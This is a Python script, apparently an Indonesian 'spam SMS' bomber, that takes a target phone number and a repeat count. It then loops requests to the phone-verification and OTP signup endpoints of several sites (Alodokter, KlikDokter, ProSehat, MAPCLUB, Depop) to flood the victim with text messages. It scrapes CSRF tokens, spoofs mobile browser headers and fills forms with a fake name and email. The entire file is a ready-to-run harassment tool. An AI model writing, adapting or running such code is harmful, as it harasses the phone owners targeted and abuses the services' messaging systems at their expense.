import requests,os,sys,time
from bs4 import BeautifulSoup as BS

class docter:
	def __init__(self):
		self.ses=requests.Session()

	def alodoc(self,num):
		self.ses.headers.update({'referer':'https://www.alodokter.com/login-alodokter'})
		req1=self.ses.get('https://www.alodokter.com/login-alodokter')
		bs1=BS(req1.text,'html.parser')
		token=bs1.find('meta',{'name':'csrf-token'})['content']
#		print(token)

		head={
			'user-agent':'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type':'application/json',
			'referer':'https://www.alodokter.com/login-alodokter',
			'accept':'application/json',
			'origin':'https://www.alodokter.com',
			'x-csrf-token':token
		}
		req2=self.ses.post('https://www.alodokter.com/login-with-phone-number',headers=head,json={"user":{"phone":num}})
#		print(req2.json())

	def klikdok(self,num):
		req1=self.ses.get('https://m.klikdokter.com/users/create')
		bs=BS(req1.text,'html.parser')
		token=bs.find('input',{'name':'_token'})['value']
#		print(token)

		head={
			'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Origin': 'https://m.klikdokter.com',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Referer': 'https://m.klikdokter.com/users/create?back-to=',
		}
		ata={
			'_token':token,
			'full_name':'BambangSubianto',
			'email':'Hsjakaj@jskaka.com',
			'phone':num,
			'back-to':'',
			'submit':'Daftar',
		}

		req2=self.ses.post('https://m.klikdokter.com/users/check',headers=head,data=ata)
		print(req2.url)
		if "sessions/auth?user=" in req2.url:
			print("\33[36;1m[\33[37;1m•\33[36;1m] BERHASIL TERKIRIM")
		else:
			print("\33[36;1m[\33[37;1m×\33[36;1m] GAGAL TERKIRIM")

	def prosehat(self,num):
		head={
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'origin': 'https://www.prosehat.com',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'referer': 'https://www.prosehat.com/akun',
		}
		ata={'phone_or_email':num,'action':'ajaxverificationsend'}

		req=requests.post('https://www.prosehat.com/wp-admin/admin-ajax.php',data=ata,headers=head)
#		print(req.text)

	def mulai(self,num):
		head={
			'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
			'Referer': 'https://www.mapclub.com/en/user/signup',
			'Host': 'cmsapi.mapclub.com',
		}
		ata={
			'phone': num
		}

		req=requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=ata)
#		print(req.text)

	def mampus(self,num):
		head={
			'Host':'webapi.depop.com',
			'content-length':'50',
			'accept':'application/json, text/plain, */*',
			'sec-ch-ua-mobile':'?0',
			'save-data':'on',
			'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
			'content-type':'application/json',
			'origin':'https://signup.depop.com',
			'sec-fetch-site':'same-site',
			'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
			'referer':'https://signup.depop.com/',
			'accept-encoding':'gzip, deflate, br',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		ata={
			'phone_number': num,
			'country_code': 'ID'
		}

		req=requests.put('https://webapi.depop.com/api/v1/auth/verify/phone', headers=head, json=ata)
#		print(req.text)

while True:
	try:
		os.system('clear')
		print("""
\33[36;1m         ╔═╗\33[37;1m┌─┐┌─┐┌┬┐\33[36;1m       ╔═╗╔╦╗╔═╗
\33[36;1m         ╚═╗\33[37;1m├─┘├─┤│││  ───\33[36;1m  ╚═╗║║║╚═╗
\33[36;1m         ╚═╝\33[37;1m┴  ┴ ┴┴ ┴\33[36;1m       ╚═╝╩ ╩╚═╝
\33[36;1m               [\33[37;1m BY FARHAN KBM\33[36;1m ]
	""")
		pil=int(input("\33[36;1m[\33[37;1m+\33[36;1m] PILIH\33[37;1m :\33[36;1m "))
		print()
		print("\33[37;1m═"*34)
		num=input("\33[36;1m[\33[37;1m+\33[36;1m] NOMOR TARGET\33[37;1m :\33[36;1m ")
		lop=int(input("\33[36;1m[\33[37;1m+\33[36;1m] JUMLAH SPAM \33[37;1m :\33[36;1m "))
		print()
		print("\33[36;1mSPAM DI MULAI DARI SEKARANG!!")
		print()
		main=docter()
		if pil == 1:
			for i in range(lop):
				main.alodoc(num)
				time.sleep(4)
				main.mulai(num)
				time.sleep(4)
				main.prosehat(num)
				time.sleep(4)
				main.mampus(num)
		elif pil == 2:
			for i in range(lop):
				main.klikdok(num)
		elif pil == 3:
			for i in range(lop):
				main.prosehat(num)
		elif pil == 123:
			for i in range(lop):
				main.prosehat(num)
				main.alodoc(num)
				main.prosehat(num)
				main.alodoc(num)
				main.prosehat(num)
				main.alodoc(num)
				main.prosehat(num)
				main.alodoc(num)
				main.prosehat(num)
				main.alodoc(num)
				main.prosehat(num)
				main.alodoc(num)
				main.prosehat(num)
				main.alodoc(num)
				main.prosehat(num)
				main.alodoc(num)
				main.prosehat(num)
				main.alodoc(num)
		else:
			print("[!] PILIHAN ANDA TIDAK ADA!?")

		lgi=input("\33[36;1m[\33[37;1m•\33[36;1m] SPAM LAGI Y/N\33[37;1m :")
		if lgi.lower() == 'n':
			sys.exit('ok makasih..')
	except Exception as Err:
		sys.exit(Err)
